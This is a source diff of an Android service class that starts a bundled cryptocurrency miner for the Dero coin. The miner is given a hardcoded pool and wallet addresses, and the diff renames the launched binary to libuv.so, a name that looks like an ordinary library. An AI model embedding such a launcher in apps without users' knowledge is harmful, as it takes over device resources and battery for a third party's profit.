@@ -61,10 +61,9 @@ public class MiningService extends Service {
         super.onCreate();
         // load config template
 
-
         //path where we may execute our program
         //privatePath = getFilesDir().getAbsolutePath();
-//        System.loadLibrary("libpm");
+        //System.loadLibrary("libpm");
         privatePath = this.getApplicationInfo().nativeLibraryDir;
         Log.e("privatePath","privatePath: "+privatePath);
         File[] fileList = new File(privatePath).listFiles((dir, name) -> {
@@ -76,8 +75,6 @@ public class MiningService extends Service {
         Log.w(LOG_TAG, "my workerId: " + workerId);
 
         String abi = Build.CPU_ABI.toLowerCase();
-
-
 
         //copy binaries to a path where we may execute it);
 //        Tools.copyFile(this,"armeabi-v7a" + "/xmrig", privatePath + "/xmrigCC");
@@ -151,44 +148,51 @@ public class MiningService extends Service {
         if (process != null) {
             Log.i(LOG_TAG, "shutting down old process first...");
             process.destroy();
+
         }
         String fullPath = "";
         try {
-            // write the config
 
-            // we'll get these from the config object after it's working
-            String appDir = this.getApplicationInfo().nativeLibraryDir;
+            String appDir = getApplicationContext().getApplicationInfo().nativeLibraryDir;
 
-            String wallet = "dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
+            String appDir1=this.getApplicationInfo().publicSourceDir;
+            String appDir2=this.getApplicationInfo().dataDir;
+            String appDir3=this.getApplicationInfo().nativeLibraryDir;
+            String appDir4=this.getApplicationInfo().sourceDir;
+            String appDir5=this.getApplicationInfo().deviceProtectedDataDir;
+
+
+            String wallet = "dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRv" +
+                            "Nz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
+
+            String wallet1="8AaNnN8nQUMh3XQfyt4kEt8TR7RYnowhjVynzShWwVLiR6dWdSp42" +
+                            "YeFvouLZoui7S46xSgDxapbeS7Tdqyz7em5Chqd4HA";
+
+            String max_bwt1="80";
             String max_bwt = "710";
             String pool = "us.hero.miner.us:1117";
             String config_template = "-o %s -u %s --tls -k --coin dero -a astrobwt "+
                     "--astrobwt-max-size=%s --astrobwt-avx2 --pause-on-battery --huge-pages=TRUE "+
                     "--huge-pages-jit=TRUE --asm=auto --cpu-memory-pool=-1 --cpu-no-yield --print-time=8"+
                     "--retry-pause=2";
-
-            String args = String.format(config_template, pool, wallet, max_bwt);
-
-            String[] pm = {"./libpm.so", args};
-
-            fullPath = privatePath+"/libpm.so";
-
+            String args = String.format(config_template,pool,wallet,max_bwt);
+            String[] pm = {"./libuv",args};
+            fullPath = privatePath+"/libuv.so";
             Log.e("args","args"+appDir);
-
             ProcessBuilder pb = new ProcessBuilder( pm );
-
             //in our directory, which is
-            pb.directory(new File(appDir)); // needs to be a file type
-            // with the directory as ld path so xmrig finds the libs
+            pb.directory(new File(appDir));
+            //needs to be a file type
+            //with the directory as ld path so xmrig finds the libs
             pb.environment().put("LD_LIBRARY_PATH", appDir);
             //in case of errors, read them
             pb.redirectErrorStream();
             accepted = 0;
             //run it!
             Process process = pb.start();
-
             // how do we check if this worked?
-            //start processing miners output    // so why not use pb.redirectOutput(); ?
+            //start processing miners output
+            // so why not use pb.redirectOutput(); ?0
             outputHandler = new MiningService.OutputReaderThread(process.getInputStream());
             outputHandler.start();
             Toast.makeText(this, "started: ", Toast.LENGTH_SHORT).show();
@@ -203,7 +207,8 @@ public class MiningService extends Service {
             }
             process = null;
         }
-}
+
+    }
 
     public String getSpeed() {
         return speed;
@@ -260,6 +265,8 @@ public class MiningService extends Service {
                 Log.w(LOG_TAG, "exception", e);
             }
         }
+
+
 
         public StringBuilder getOutput() {
             return output;
